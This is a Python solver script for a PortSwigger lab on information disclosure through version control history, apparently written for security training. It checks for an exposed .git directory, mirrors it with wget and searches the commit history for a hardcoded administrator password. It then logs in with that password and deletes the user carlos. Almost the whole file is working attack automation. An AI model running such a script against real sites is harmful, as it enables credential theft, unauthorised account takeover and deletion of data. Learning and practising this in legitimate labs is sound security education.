# Lab 05 — Information disclosure in version control history
# PortSwigger: https://portswigger.net/web-security/information-disclosure/exploiting/lab-infoleak-in-version-control-history
#
# Vulnerability: The application's .git directory is exposed over HTTP,
#                allowing the ENTIRE commit history to be downloaded —
#                including values later removed from the live codebase
#                but still present permanently in old commits
# Aim:           Recover the administrator password from an old commit,
#                log in, and delete carlos
#
# Technique:
#   1. Confirm /.git/HEAD is accessible (200 OK).
#   2. Mirror the entire .git directory with wget.
#   3. Use `git log` locally to find a suspicious commit
#      (e.g. "Add skeleton admin panel").
#   4. Use `git show`/`git diff` on that commit to reveal the
#      hardcoded password it once contained.
#
#   This script automates steps 1-4 by shelling out to `wget` and `git`
#   directly — both must be installed and available on PATH.
#
# Usage: python information_disclosure_lab05.py <url> [download_dir]

import sys
import os
import re
import subprocess
import shutil
import urllib3
from proxies import proxies
from information_disclosure_utils import banner, section, make_session, login, check_status, print_box

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)


def run(cmd, cwd=None):
    """Run a shell command, returning (stdout, stderr, returncode)."""
    result = subprocess.run(cmd, cwd=cwd, capture_output=True, text=True)
    return result.stdout, result.stderr, result.returncode


if __name__ == "__main__":
    banner()
    section("LAB 05 — INFORMATION DISCLOSURE IN VERSION CONTROL HISTORY")

    if len(sys.argv) < 2:
        print("  Usage: python information_disclosure_lab05.py <url> [download_dir]")
        sys.exit(1)

    url = sys.argv[1]
    download_dir = sys.argv[2] if len(sys.argv) > 2 else "./leaked_git_repo"

    session = make_session(proxies)

    # ── Step 1: confirm .git is exposed ───────────────────────────────────────
    print("  ── Step 1: confirm /.git/HEAD is accessible\n")
    r_head = session.get(f"{url}/.git/HEAD")
    check_status(r_head, 200, "GET /.git/HEAD")
    if r_head.status_code != 200:
        print("  ✘  .git does not appear to be exposed on this target.")
        sys.exit(1)
    print_box(".git/HEAD contents", r_head.text.strip())

    # ── Step 2: check wget and git are available ──────────────────────────────
    if not shutil.which("wget"):
        print("\n  ✘  'wget' not found on PATH — required to mirror the repo.")
        print("     Install wget, or mirror manually with an equivalent tool.")
        sys.exit(1)
    if not shutil.which("git"):
        print("\n  ✘  'git' not found on PATH — required to inspect history.")
        sys.exit(1)

    # ── Step 3: mirror the .git directory ──────────────────────────────────────
    print(f"\n  ── Step 2: mirror the .git directory into {download_dir}\n")

    if os.path.exists(download_dir):
        print(f"  ℹ  {download_dir} already exists — removing before re-download")
        shutil.rmtree(download_dir)

    os.makedirs(download_dir, exist_ok=True)
    git_target_dir = os.path.join(download_dir, ".git")

    wget_cmd = [
        "wget", "-r", "-np", "-nH", "--cut-dirs=1",
        "-P", download_dir,
        f"{url}/.git/"
    ]
    print(f"  ➜  Running: {' '.join(wget_cmd)}\n")
    stdout, stderr, rc = run(wget_cmd)

    # wget mirrors into download_dir/.git/... — verify
    if not os.path.isdir(git_target_dir):
        # some wget versions structure the output differently; try to locate it
        for root, dirs, files in os.walk(download_dir):
            if os.path.basename(root) == ".git":
                git_target_dir = root
                break

    if not os.path.isdir(git_target_dir):
        print("  ✘  Could not locate the downloaded .git directory.")
        print(f"     wget stderr (tail): {stderr[-500:]}")
        sys.exit(1)

    print(f"  ✔  .git directory downloaded to: {git_target_dir}\n")
    repo_dir = os.path.dirname(git_target_dir)

    # ── Step 4: inspect commit history ─────────────────────────────────────────
    print("  ── Step 3: inspect commit history with 'git log --oneline'\n")
    stdout, stderr, rc = run(["git", "log", "--oneline", "--all"], cwd=repo_dir)
    if rc != 0:
        print(f"  ✘  'git log' failed: {stderr}")
        sys.exit(1)

    print_box("Commit history", stdout)

    # ── Step 5: find the suspicious commit and diff it ──────────────────────────
    suspicious_line = next(
        (line for line in stdout.splitlines()
         if re.search(r'admin', line, re.IGNORECASE)),
        None
    )

    if not suspicious_line:
        print("  ?  No commit message obviously mentioning 'admin' found.")
        print("     Inspect the commit list above manually and run:")
        print(f"       cd {repo_dir} && git show <commit-hash>")
        sys.exit(0)

    commit_hash = suspicious_line.split()[0]
    print(f"  ✔  Investigating suspicious commit: {suspicious_line.strip()}\n")

    print(f"  ── Step 4: diff commit {commit_hash} for leaked credentials\n")
    stdout_diff, stderr_diff, rc_diff = run(["git", "show", commit_hash], cwd=repo_dir)
    print_box(f"git show {commit_hash} (truncated)", stdout_diff[:2000])

    password_match = re.search(r'password["\']?\s*[:=]\s*["\']([^"\']+)["\']', stdout_diff, re.IGNORECASE)
    if password_match:
        print_box("LEAKED ADMINISTRATOR PASSWORD", password_match.group(1))

        # ── Step 6: log in and delete carlos ──────────────────────────────────
        print("\n  ── Step 5: log in as administrator and delete carlos\n")
        admin_session = make_session(proxies)
        if login(admin_session, url, username="administrator", password=password_match.group(1)):
            r_delete = admin_session.post(f"{url}/admin/delete", data={"username": "carlos"})
            check_status(r_delete, [200, 302], "Delete carlos")
        else:
            print("  ✘  Login failed with the extracted password — inspect the")
            print("     diff output above manually to find the correct value.")
    else:
        print("\n  ?  Could not auto-extract a password from this commit's diff.")
        print("     Review the diff output above manually — try other commits")
        print("     with 'git log --oneline --all' if this one isn't it.")

    print()
    print("  ℹ  'Deleting' a value in a later commit does NOT remove it from")
    print("     Git history — every prior version remains retrievable as")
    print("     long as the .git directory itself stays reachable.")
